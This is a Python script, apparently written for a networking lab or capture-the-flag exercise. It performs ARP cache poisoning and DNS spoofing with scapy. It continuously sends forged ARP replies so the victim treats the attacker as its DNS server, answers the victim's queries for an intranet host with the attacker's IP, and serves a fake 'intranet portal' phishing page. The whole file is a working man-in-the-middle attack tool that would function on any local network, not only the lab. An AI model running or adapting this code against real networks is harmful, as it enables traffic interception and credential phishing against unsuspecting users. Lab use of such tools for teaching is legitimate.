#!/usr/bin/env python3
import argparse
import http.server
import os
import threading
import time
from pathlib import Path

from scapy.all import ARP, DNS, DNSQR, DNSRR, Ether, IP, UDP, get_if_hwaddr, sendp, sniff, srp1


FLAG_FILE = Path("/run/lab/dns.flag")


def resolve_mac(interface, ip):
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    reply = srp1(packet, iface=interface, timeout=2, verbose=False)
    if reply is None:
        raise SystemExit(f"could not resolve {ip} on {interface}")
    return reply[Ether].src


class PhishHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print("phish", fmt % args, flush=True)

    def do_GET(self):
        flag = FLAG_FILE.read_text(encoding="utf-8").strip() if FLAG_FILE.exists() else "flag{missing}"
        Path("/tmp/dns-hit").write_text(flag + "\n", encoding="utf-8")
        print(f"victim reached phishing server: {flag}", flush=True)
        body = f"fake intranet portal\nFLAG_DNS={flag}\n".encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def poison_loop(interface, victim_ip, victim_mac, dns_ip, attacker_mac):
    packet = (
        Ether(dst=victim_mac, src=attacker_mac)
        / ARP(op=2, psrc=dns_ip, hwsrc=attacker_mac, pdst=victim_ip, hwdst=victim_mac)
    )
    while True:
        sendp(packet, iface=interface, verbose=False)
        time.sleep(1)


def answer(packet, interface, victim_ip, victim_mac, dns_ip, attacker_ip, attacker_mac):
    if IP not in packet or UDP not in packet or DNS not in packet:
        return
    if packet[IP].src != victim_ip or packet[UDP].dport != 53:
        return
    dns = packet[DNS]
    if dns.qd is None:
        return
    qname = dns.qd.qname.decode(errors="replace")
    if "app.intranet.lab" not in qname:
        return
    response = (
        Ether(src=attacker_mac, dst=victim_mac)
        / IP(src=dns_ip, dst=victim_ip)
        / UDP(sport=53, dport=packet[UDP].sport)
        / DNS(
            id=dns.id,
            qr=1,
            aa=1,
            rd=dns.rd,
            qd=dns.qd,
            an=DNSRR(rrname=dns.qd.qname, type="A", ttl=30, rdata=attacker_ip),
        )
    )
    sendp(response, iface=interface, verbose=False)
    print(f"spoofed {qname} -> {attacker_ip}", flush=True)


def main():
    parser = argparse.ArgumentParser(description="ARP + DNS spoofing for the lab.")
    parser.add_argument("-i", "--interface", required=True)
    parser.add_argument("--victim", required=True)
    parser.add_argument("--victim-mac", help="optional; resolved automatically when omitted")
    parser.add_argument("--dns-ip", default="10.30.50.53")
    parser.add_argument("--attacker-ip", default="10.30.50.99")
    args = parser.parse_args()

    Path("/run/lab").mkdir(exist_ok=True)
    if not FLAG_FILE.exists():
        FLAG_FILE.write_text(f"flag{{{__import__('uuid').uuid4()}}}\n", encoding="utf-8")

    attacker_mac = get_if_hwaddr(args.interface)
    if not args.victim_mac:
        args.victim_mac = resolve_mac(args.interface, args.victim)
    os.system("sysctl -w net.ipv4.ip_forward=0 >/dev/null")
    threading.Thread(
        target=http.server.ThreadingHTTPServer(("0.0.0.0", 80), PhishHandler).serve_forever,
        daemon=True,
    ).start()
    threading.Thread(
        target=poison_loop,
        args=(args.interface, args.victim, args.victim_mac, args.dns_ip, attacker_mac),
        daemon=True,
    ).start()
    print(f"phishing server on {args.attacker_ip}:80; waiting for DNS queries", flush=True)
    sniff(
        iface=args.interface,
        filter=f"udp port 53 and src host {args.victim}",
        prn=lambda packet: answer(
            packet,
            args.interface,
            args.victim,
            args.victim_mac,
            args.dns_ip,
            args.attacker_ip,
            attacker_mac,
        ),
        store=False,
    )


if __name__ == "__main__":
    main()
